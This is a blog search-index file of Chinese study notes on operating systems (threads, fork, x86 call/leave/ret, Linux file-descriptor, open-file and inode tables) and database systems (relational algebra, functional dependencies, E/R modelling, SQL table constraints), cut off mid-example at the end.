<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>哈工大操作系统</title>
      <link href="/2025/12/29/%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2025/12/29/%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p><img src="/../posts_img/%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/nb.png" alt="00"></p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p><img src="/../posts_img/%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E7%BA%BF%E7%A8%8B.png" alt="01"></p><hr><h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h3><p><img src="/../posts_img/%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/fork().png" alt="02"></p><hr><h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p><img src="/../posts_img/%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%86%85%E5%AD%98.png" alt="03"></p><hr><h3 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h3><p><img src="/../posts_img/%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E7%A3%81%E7%9B%98.png" alt="04"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>call和leave和ret</title>
      <link href="/2025/10/02/call%E5%92%8Cleave%E5%92%8Cret/"/>
      <url>/2025/10/02/call%E5%92%8Cleave%E5%92%8Cret/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">call func 等价于</span><br><span class="line">push eip</span><br><span class="line">mov eip, func</span><br><span class="line">----------</span><br><span class="line">函数开头常用指令</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line">sub esp, N   ; 为局部变量分配空间</span><br><span class="line">----------</span><br><span class="line">leave 等价于</span><br><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">----------</span><br><span class="line">ret 等价于</span><br><span class="line">pop eip</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux管理打开文件的方式</title>
      <link href="/2025/08/01/Linux%E7%AE%A1%E7%90%86%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/08/01/Linux%E7%AE%A1%E7%90%86%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>进程打开文件会涉及三个表：进程的文件描述符表、系统的打开文件表、系统的<code>inode</code>表</p><blockquote><h3 id="1-文件描述符表（FD-表）"><a href="#1-文件描述符表（FD-表）" class="headerlink" title="1. 文件描述符表（FD 表）"></a>1. <strong>文件描述符表（FD 表）</strong></h3><ul><li><strong>作用：</strong> 每个进程独有，用于追踪进程当前打开的文件。</li><li><strong>内容：</strong> 是一个数组，存放<strong>文件描述符（整数）与打开文件表项的指针</strong>的映射。</li><li><strong>代表性内容：</strong><br><code>fd 0 -&gt; stdin</code><br> <code>fd 1 -&gt; stdout</code><br> <code>fd 3 -&gt; pointer to file table entry X</code></li></ul><hr><h3 id="2-系统打开文件表（file-table）"><a href="#2-系统打开文件表（file-table）" class="headerlink" title="2. 系统打开文件表（file table）"></a>2. <strong>系统打开文件表（file table）</strong></h3><ul><li><strong>作用：</strong> 系统级别，用于管理所有进程当前打开的文件。</li><li><strong>内容：</strong> 每个表项对应一个打开文件，包含：</li><li>读写指针</li><li>打开模式（只读&#x2F;读写等）。open(“file”, “rw”)时指定的读写模式就保存在这里。</li><li>指向 inode 表的指针</li><li>引用计数</li><li><strong>代表性内容：</strong><br><code>offset: 1024</code><br> <code>flags: O_RDWR</code><br> <code>inode ptr: → inode#123</code></li></ul><hr><h3 id="3-inode-表（inode-table）"><a href="#3-inode-表（inode-table）" class="headerlink" title="3. inode 表（inode table）"></a>3. <strong>inode 表（inode table）</strong></h3><ul><li><strong>作用：</strong> 表示磁盘上实际的文件元信息，多个文件描述符可能共用。打开一个文件主要操作就在这里，将目标文件的<code>inode</code>节点复制到这里来。</li><li><strong>内容：</strong> 文件的元数据：</li><li>文件类型、权限</li><li>文件大小</li><li>磁盘块位置</li><li>引用计数(在内存中时，包括了打开文件表的引用+磁盘中硬链接的引用)</li><li><strong>代表性内容：</strong><br><code>inode#123: size=8KB, owner=UID1000, blocks=[...], type=regular file</code></li></ul></blockquote><p>而影响这三个表，最具代表性的就是<code>open</code>、<code>fork</code>、<code>dup</code>。</p><p><code>open()</code>：首先，操作系统允许一个进程多次使用<code>open</code>打开同一个文件，并且每一次<code>open</code>都一定会在进程文件描述符表和<u><strong>系统的文件打开表</strong>创建一个表项</u>。由于文件的<strong>读写指针</strong>存储在的文件打开表中，因此同一个进程不同的<code>open</code>同一个文件以及不同进程<code>open</code>同一个文件都意味着返回的<code>fd</code>指向各自不同的打开文件表的表项，并且不影响对方的读写指针。两个打开文件表的表项指向同一个<code>inode</code>表。</p><blockquote><p>open()函数虽然说不会重复打开文件，但这指的是不会重复调度同一个<code>inode</code>节点到内存中的<code>inode</code>表中。</p><p>open()函数只要到一个文件路径就会按照这个文件路径去检索，检索到<code>inode</code>节点后会带着这个节点的<code>id</code>去系统的<code>inode</code>表中对比看看是不是已经加载过了。如果能找到就不用再多启动一次磁盘，让新创建的文件打开表的表项指向这个<code>inode</code>即可。因此这就会出现，两个打开文件表的表项指向同一个<code>inode</code>表表项的情况。当然，如果是硬链接，即使<code>open</code>的文件路径不同也可能出现这一情况。</p></blockquote><p><code>dup()</code>：<code>dup</code>的作用就是复制文件描述符表项，返回不同的<code>fd</code>，这意味着一个进程会有两个文件描述符表项指向同一个打开文件表的表项。当然，这也使得两个<code>fd</code>共享同一个读写指针。</p><p><code>fork()</code>：因为父子进程的关系，所以即使是两个进程也会出现各自的文件描述符表项指向同一个打开文件表的表项。因此这两个文件的读写肯定会影响到对方。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统概论</title>
      <link href="/2024/12/29/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/"/>
      <url>/2024/12/29/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h2><p><strong>关系模型</strong>，是数据模型的一种，数据模型还有层次模型和网状模型等。重点讲述关系数据模型</p><p>数据模型是现实世界数据特征的抽象，它有三个要素：</p><ul><li>数据结构</li><li>数据操作</li><li>数据上的约束</li></ul><h3 id="关系数据模型"><a href="#关系数据模型" class="headerlink" title="关系数据模型"></a>关系数据模型</h3><ul><li>关系：就是一张二维数据表</li><li>属性：关系的列，是关系特征的描述</li><li>模式：由关系名和属性组成<ul><li><code>movies(title, year, length, genre)</code></li></ul></li><li>元组：就是关系的一行<ul><li>(红海行动, 2018, 138, 动作)</li></ul></li><li>域：属性的数据类型及取值范围，约束了一个关系的列</li></ul><h3 id="关系的性质-关系的约束"><a href="#关系的性质-关系的约束" class="headerlink" title="关系的性质(关系的约束)"></a>关系的性质(关系的约束)</h3><ul><li>不能出现相同的行</li><li>不能出现相同的列名</li><li>列已经是不可分割的最小数据项</li><li>可以交换任意两行的顺序</li><li>可以交换任意两列的顺序</li><li>每一列的数据类型、数据范围必须一致</li></ul><h3 id="投影运算"><a href="#投影运算" class="headerlink" title="投影运算"></a>投影运算</h3><p>从关系R中取出几个列组成一个新的关系。</p><p>因为取出的列组成的关系有三个相同的元组，所以需要删掉两个元组。</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch2/00.png" alt="00"></p><h3 id="选择运算"><a href="#选择运算" class="headerlink" title="选择运算"></a>选择运算</h3><p>从关系R中取出几行组成一个新的关系。</p><p>从关系R中取出满足条件c的元组组成一个新的关系</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch2/01.png" alt="01"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>先 <strong>选择</strong> 再 <strong>投影</strong>，即先筛选行组成新的关系，再挑选列组成新的关系</p><h2 id="三种连接"><a href="#三种连接" class="headerlink" title="三种连接"></a>三种连接</h2><h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><p>两个关系的各个元组总共有多少种组合方式</p><p>关系R和S的乘运算也称为笛卡尔积，记作 R × S</p><ul><li>设关系R有i个属性，关系S有j个属性，则 R × S 有 (i + j) 个属性</li><li>设R有m个元组，S有n个元组，则 R × S 有 (m × n) 个元组</li><li>每个元组的前i个属性是R的一个元组r，后j个属性是S的一个元组s</li></ul><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch2/03.png" alt="03"></p><h3 id="自然连接"><a href="#自然连接" class="headerlink" title="自然连接"></a>自然连接</h3><p>在笛卡尔积的基础上，r 元组和 s元组连接需要满足以下条件：</p><ul><li>R 和 S存在某些共同的属性</li><li>R 和 S在这些共同属性上的值相同</li></ul><p>连接后的元组相同的属性只能保留一个</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch2/04.png" alt="04"></p><h3 id="θ连接"><a href="#θ连接" class="headerlink" title="θ连接"></a>θ连接</h3><p>在笛卡尔积的基础上r 元组和 s元组连接需要满足自定义条件 c</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch2/05.png" alt="05"></p><h2 id="关系上的约束"><a href="#关系上的约束" class="headerlink" title="关系上的约束"></a>关系上的约束</h2><h3 id="实体完整性约束"><a href="#实体完整性约束" class="headerlink" title="实体完整性约束"></a>实体完整性约束</h3><ul><li>键（也称码）：关系中某一属性或属性组的值能唯一标识一个元组，则称该属性或属性组为关系的键（码）</li><li>候选键（也称候选码）：若一个关系中存在多个键，这些键统称为候选键，从候选键中选一个键作为关系的键，这个键被称为<strong>主键</strong>（也称主码）。</li><li>主属性：<strong>候选键</strong>中的属性统称为主属性。</li></ul><p>关系R的实体完整性约束：若属性A是关系R的主属性，则A不能取空值。控制（NULL）不是0，也不是空字符串，而是没有值。</p><h3 id="参照完整性约束"><a href="#参照完整性约束" class="headerlink" title="参照完整性约束"></a>参照完整性约束</h3><p>外键：设<code>F</code>是关系<code>R</code>的一个或一组属性，但不是关系<code>R</code>的主键。如果<code>F</code>与关系<code>S</code>的某个键<code>KS</code>相对应（即实际意义相同，可以不同名），则</p><ul><li>称F是关系R的外键</li><li>称关系R为参照关系</li><li>称关系S为被参照关系</li><li>外键是参照关系的一个键，另一个关系则是被参照关系</li></ul><p>参照完整性规则：若属性（或属性组）F是关系R的外键，他与基本关系S的主码KS相对应，则对于</p><p>R中的每个元组在F上的值必须满足：</p><ul><li>或者取空值（F属性组的每个属性均为空值），</li><li>或者等于S中某个元组的主键值。</li></ul><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch2/02.png" alt="02"></p><h3 id="自定义完整性约束"><a href="#自定义完整性约束" class="headerlink" title="自定义完整性约束"></a>自定义完整性约束</h3><p>定义的完整性是针对某一具体要求来定义的约束条件，它反映某一具体应用所涉及的数据必须满足的<strong>语义要求</strong>。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li>实体完整性约束：针对主属性的约束，不能为空</li><li>参照完整性约束：针对外键的约束，要么为空要么有一个既定的值</li><li>自定义完整性约束：对某个属性的值有要求</li></ul><h2 id="关系数据库设计理论"><a href="#关系数据库设计理论" class="headerlink" title="关系数据库设计理论"></a>关系数据库设计理论</h2><h3 id="函数依赖"><a href="#函数依赖" class="headerlink" title="函数依赖"></a>函数依赖</h3><p>关系R的两个元组在属性A上相同，在属性B上必定也相同，则称作 <strong>A决定B，或者B依赖于A，记作 A→B</strong></p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/00.png" alt="00"></p><p>属性之间的<strong>决定</strong>是属性与属性之间的关系，并不涉及元组内所有属性。</p><p>但是<strong>键</strong>就涉及了一个关系的所有属性。</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/01.png" alt="00"></p><ul><li>主键：在一个关系中可能会存在多个键，这些键统称为<strong>候选键</strong>，从候选键中指定一个键作为主键。注意键是由属性组成的(一般有大括号括起来)</li><li>主属性：候选键中的属性称为<strong>主属性</strong></li><li>超键：包含键的属性<strong>集</strong>称为超键</li></ul><h3 id="函数依赖的规则"><a href="#函数依赖的规则" class="headerlink" title="函数依赖的规则"></a>函数依赖的规则</h3><p>记：A &#x3D; { A1A2…An }，<br>       B &#x3D; { B1B2…Bm },<br>       C &#x3D; { C1C2…Ck }.<br>存在 FD：B -&gt; C，A -&gt; B，A -&gt; C</p><ul><li>B -&gt; C，且 C 是 B 的子集，即 C完全是B的一部分<br>  称 B -&gt; C 是<strong>平凡的</strong>函数依赖</li><li>A -&gt; B，且 A 与 B 有一部分属性重叠<br>  称 A -&gt; B 是 <strong>非平凡的</strong>函数依赖</li><li>A -&gt; C，且 A 与 C 没有属性重合，即两个完全独立的属性集合<br>  称 A -&gt; C 是<strong>完全非平凡的</strong>函数依赖</li></ul><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/02.png" alt="00"></p><h4 id="等价"><a href="#等价" class="headerlink" title="等价"></a>等价</h4><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/03.png" alt="00"></p><p>这个例子中，A决定B的同时也满足A决定B1，所以前者蕴含后者，后者蕴含于前者。</p><h4 id="分解和合并规则"><a href="#分解和合并规则" class="headerlink" title="分解和合并规则"></a>分解和合并规则</h4><p>左边的属性集不动，右边的属性集可以任意<strong>拆分与合并</strong></p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/04.png" alt="00"></p><h4 id="传递规则"><a href="#传递规则" class="headerlink" title="传递规则"></a>传递规则</h4><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/05.png" alt="00"></p><h4 id="三大公理"><a href="#三大公理" class="headerlink" title="三大公理"></a>三大公理</h4><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/06.png" alt="00"></p><h4 id="最小基本集"><a href="#最小基本集" class="headerlink" title="最小基本集"></a>最小基本集</h4><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/07.png" alt="00"></p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/08.png" alt="00"></p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/09.png" alt="00"></p><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>闭包是属性集</p><p>闭包是函数依赖的极限</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/10.png" alt="00"></p><p>计算闭包的模板</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/11.png" alt="00"></p><p>可以通过闭包求一个关系键，<strong>如果一个属性集的闭包包含了其它属性，说明这个属性集就可以决定其它所有属性</strong>，所以这个属性集可以作为该关系的键</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/12.png" alt="00"></p><p>给定一个关系 R 和该关系的函数依赖集 S，先给出 R 的投影（子关系）R1，求 R1 的函数依赖集 S1：</p><p>做法就是：求出单个元素、两个元素、三个元素……在R上的闭包，而这些闭包就需要根据 S 来判断，然后摘出 R1 上有的元素 的函数依赖，将他们组成函数依赖集。为了保证是最小基本集，一般来说箭头的右边都只有一个属性</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch3/13.png" alt="00"></p><h2 id="高级数据库模型"><a href="#高级数据库模型" class="headerlink" title="高级数据库模型"></a>高级数据库模型</h2><h3 id="E-R模型"><a href="#E-R模型" class="headerlink" title="E&#x2F;R模型"></a>E&#x2F;R模型</h3><p>数据库的<strong>概念设计</strong>，称为高级数据库设计</p><p><strong>概念模型</strong>，称为高级数据库模型</p><p>在概念设计阶段，将解决和回答下属问题：</p><ul><li>存储哪些信息</li><li>信息元素如何相互关联</li><li>有哪些约束（如键和引用完整性）</li></ul><p>表示概念设计的符号：</p><ul><li><strong>E&#x2F;R图（实体关系图）</strong></li><li>UML (同一建模语言)</li><li>ODL (对象描述语言)</li></ul><h3 id="E-R模型——三要素"><a href="#E-R模型——三要素" class="headerlink" title="E&#x2F;R模型——三要素"></a>E&#x2F;R模型——三要素</h3><ul><li><strong>实体集</strong>（用矩形表示）<br>  实体集是同一类型实体的集合<br>  实体是客观存在并相互区别的事物，实体可以是具体的人、事或物</li><li><strong>属性</strong>（用椭圆表示）<br>  实体所具有的特征称为属性，一个实体可具有多个属性</li><li><strong>联系</strong>（用菱形表示）<br>  在现实世界中，事物内部以及事物之间是有联系的，这些联系在信息世界中反映为实体集内部的联系和不同实体集之间的联系</li></ul><p>实体集A和实体集B可能存在三种联系：</p><ul><li>一对一联系（1 ：1）</li><li>多对一联系（n ：1）</li><li>多对多联系（m ：n）</li></ul><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/00.png" alt="00"></p><h3 id="E-R模型中的子类"><a href="#E-R模型中的子类" class="headerlink" title="E&#x2F;R模型中的子类"></a>E&#x2F;R模型中的子类</h3><p>**”isa”**是一对一联系，用三角形表示，将一个实体集和它的子类连接起来</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/01.png" alt="01"></p><p>一个E&#x2F;R图</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/02.png" alt="02"></p><h2 id="逻辑结构设计"><a href="#逻辑结构设计" class="headerlink" title="逻辑结构设计"></a>逻辑结构设计</h2><h3 id="实体集到关系的转化"><a href="#实体集到关系的转化" class="headerlink" title="实体集到关系的转化"></a>实体集到关系的转化</h3><p>转化规则：</p><ul><li>一个实体集转化成一个关系模式（一张表）</li><li>实体集的属性转化成关系的属性（表的列）</li><li>实体集的键转化成关系的键</li></ul><p>联系如何转换成关系：</p><h3 id="二路联系"><a href="#二路联系" class="headerlink" title="二路联系"></a>二路联系</h3><p>一对一的联系：</p><ul><li>方法一：将联系单独转化为一个关系模式，联系原有的属性转化为关系的属性，关系的键由两个实体集的键组合而成。</li><li>方法二：选择一个实体集对应的关系模式，将联系转化成该关系的属性并入，如何转化？保留联系原有的属性并加上另一个实体集的键。</li></ul><p>多对一的联系：</p><ul><li>方法一：将联系单独转化为一个关系模式，联系原有的属性转化为关系的属性，关系的键由两个实体集的键组合而成。</li><li>方法二：选择一端将联系并入，并入方法和上面一样，但是选择<strong>多端合并</strong>。为什么选择多端？如果选择多端，就是多端的每个元组加一列来存储一端的键来维持联系；但如果选择一端，就需要一端复制自己生成n个元组并添加一列来存储多端的键来维持联系，重点是需要凭空多出n个元组来维持联系这是严重的冗余。</li></ul><p>多对多的联系：</p><ul><li>只有一种方法：将联系单独转化为一个关系模式，联系原有的属性转化为关系的属性，关系的键由两个实体集的键组合而成。</li></ul><h3 id="多路联系"><a href="#多路联系" class="headerlink" title="多路联系"></a>多路联系</h3><p>只有一种方法：将联系单独转化为一个关系模式，联系原有的属性转化为关系的属性，关系的键由两个实体集的键组合而成。</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/03.png" alt="03"></p><h3 id="isa联系"><a href="#isa联系" class="headerlink" title="isa联系"></a>isa联系</h3><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/04.png" alt="04"></p><h3 id="弱实体到关系的转化"><a href="#弱实体到关系的转化" class="headerlink" title="弱实体到关系的转化"></a>弱实体到关系的转化</h3><p>弱实体转化为关系后的模式组成：</p><ul><li>弱实体原有的属性</li><li>支持联系所有的属性</li><li>支持实体集的键作为弱实体的键</li></ul><p>支持联系不用转化为关系</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/05.png" alt="05"></p><h2 id="数据库语言SQL"><a href="#数据库语言SQL" class="headerlink" title="数据库语言SQL"></a>数据库语言SQL</h2><h3 id="定义关系模式"><a href="#定义关系模式" class="headerlink" title="定义关系模式"></a>定义关系模式</h3><p>使用 <strong>CREATE TABLE</strong> 定义关系型模式（创建表）</p><p><code>CHAR</code>是定长字符串，<code>NCHAR</code>表示明确使用<code>unicode</code>编码。</p><p><code>CHAR(50)</code>和<code>VARCHAR(50)</code>的区别在于，<code>CHAR(50)</code>是一个定长字符数组，如果输入不够50个字符后面会补<code>50 - n</code>个空格，当然输入不能大于50个字符；<code>VARCHAR(50)</code>是不定长的字符串，50只限制了最大输入字符串，存储的字符数该输入多少个就是多少个。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> Movies (</span><br><span class="line">title <span class="type">NCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    <span class="keyword">year</span> <span class="type">INT</span>,</span><br><span class="line">    length <span class="type">INT</span>,</span><br><span class="line">    genre <span class="type">NCHAR</span>(<span class="number">10</span>),</span><br><span class="line">    studioName NVARCHAR(<span class="number">30</span>), </span><br><span class="line">    producerC# <span class="type">INT</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="定义主键"><a href="#定义主键" class="headerlink" title="定义主键"></a>定义主键</h5><p>在关系中可以选择一个属性作为主键，也可以选择一组属性作为主键。在创建表时也可以选择一个或一组属性作为主键，不过定义的方法不同。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> MovieStars (</span><br><span class="line">name <span class="type">NCHAR</span>(<span class="number">30</span>) <span class="keyword">PRIMARY KEY</span>, <span class="comment">-- 选择一个属性作为主键</span></span><br><span class="line">    address NVARCHAR(<span class="number">255</span>),</span><br><span class="line">    gender <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line">    birthdate DATETIME</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE TABLE</span> Movies (</span><br><span class="line">title <span class="type">NCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    <span class="keyword">year</span> <span class="type">INT</span>,</span><br><span class="line">    length <span class="type">INT</span>,</span><br><span class="line">    genre <span class="type">NCHAR</span>(<span class="number">10</span>),</span><br><span class="line">    studioName NVARCHAR(<span class="number">30</span>), </span><br><span class="line">    producerC# <span class="type">INT</span>,</span><br><span class="line">    <span class="keyword">PRIMARY KEY</span>(title, <span class="keyword">year</span>), <span class="comment">-- 选择一组属性作为主键</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="唯一约束UNIQUE"><a href="#唯一约束UNIQUE" class="headerlink" title="唯一约束UNIQUE"></a>唯一约束UNIQUE</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> MovieStars (</span><br><span class="line">name <span class="type">NCHAR</span>(<span class="number">30</span>) <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    address NVARCHAR(<span class="number">255</span>) <span class="keyword">UNIQUE</span>,</span><br><span class="line">    gender <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line">    birthdate DATETIME</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li><code>UNIQUE</code>约束：在该列的取值必须唯一，<strong>但可以取空值</strong></li><li><code>PRIMARY KEY</code>约束：在该列的取值必须唯一，不能取空值</li></ul><h5 id="定义空值约束NULL"><a href="#定义空值约束NULL" class="headerlink" title="定义空值约束NULL"></a>定义空值约束NULL</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> MovieStars (</span><br><span class="line">    name <span class="type">NCHAR</span>(<span class="number">30</span>) <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    address NVARCHAR(<span class="number">255</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    gender <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line">    birthdate DATETIME</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li><code>NULL</code>约束：没写<code>NOT NULL</code>就是默认<code>NULL</code>，表示属性可以取空值；当然主键还是不能取空值的</li><li><code>NOT NULL</code>约束：表示该属性不能取空值</li></ul><h5 id="基于属性的CHECK约束"><a href="#基于属性的CHECK约束" class="headerlink" title="基于属性的CHECK约束"></a>基于属性的CHECK约束</h5><p><code>CHECK</code>约束是当该属性获得新值时被检查。</p><p>有2种写法，一种是在定义属性时顺便加上，另一种是另起一行加个<code>CONSTRAINT</code>关键字专门写约束</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> MovieStars (</span><br><span class="line">name <span class="type">NCHAR</span>(<span class="number">30</span>) <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    address NVARCHAR(<span class="number">255</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    gender <span class="type">CHAR</span>(<span class="number">1</span>) <span class="keyword">CHECK</span> (gender <span class="keyword">in</span> (<span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;M&#x27;</span>)),</span><br><span class="line">    birthdate DATETIME</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span 